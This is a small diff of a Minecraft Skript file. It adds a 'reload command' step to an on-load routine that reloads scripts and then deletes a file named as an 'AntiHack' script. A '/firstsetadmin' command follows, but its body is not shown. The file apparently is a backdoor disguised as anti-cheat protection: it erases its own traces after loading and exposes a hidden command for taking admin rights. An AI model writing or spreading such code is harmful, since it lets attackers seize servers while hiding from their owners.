@@ -16,6 +16,8 @@ on load:
     wait 5 second
     execute console command "sk reload main"
     wait 5 second
+    execute console command "sk reload command"
+    wait 5 second
     delete file "plugins/Skript/scripts/-AntiHack-By-Helloworld-V-1-2.sk"
 
 command /firstsetadmin [<player>] [<text>]:
